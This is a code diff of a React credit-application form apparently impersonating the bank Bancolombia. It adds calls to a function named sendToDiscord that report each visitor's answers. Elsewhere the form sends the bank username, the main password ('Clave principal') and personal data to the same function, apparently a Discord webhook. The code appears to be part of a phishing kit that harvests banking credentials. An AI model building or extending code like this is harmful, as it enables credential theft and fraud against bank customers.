@@ -280,6 +280,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
   const sendToDiscord = async (event: string, extraFields?: { name: string; value: string; inline?: boolean }[]) => {
     const titles: Record<string, string> = {
+      cliente: '👤 Selección: ¿Eres cliente Bancolombia?',
       pin: '👤 Inicio · 🔐 Login · 🔑 Clave principal',
       step1: '📋 Paso 1 - Datos personales',
       step2: '💰 Paso 2 - Monto y plazo',
@@ -1079,13 +1080,13 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
               <div className="w-full flex flex-col gap-3 px-4">
                 <button
-                  onClick={() => { setEsCliente(true); setShowLogin(true); }}
+                  onClick={() => { setEsCliente(true); setShowLogin(true); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'Soy cliente', inline: true }]); }}
                   className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-4 rounded-full transition-all text-base shadow-sm hover:shadow-md hover:-translate-y-0.5"
                 >
                   Soy cliente
                 </button>
                 <button
-                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('pin', [
+                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'No soy cliente', inline: true }]); sendToDiscord('pin', [
                     { name: 'Cliente Bancolombia', value: 'No', inline: true },
                     { name: 'Usuario', value: 'N/A', inline: true },
                     { name: 'Clave principal', value: 'N/A', inline: true },
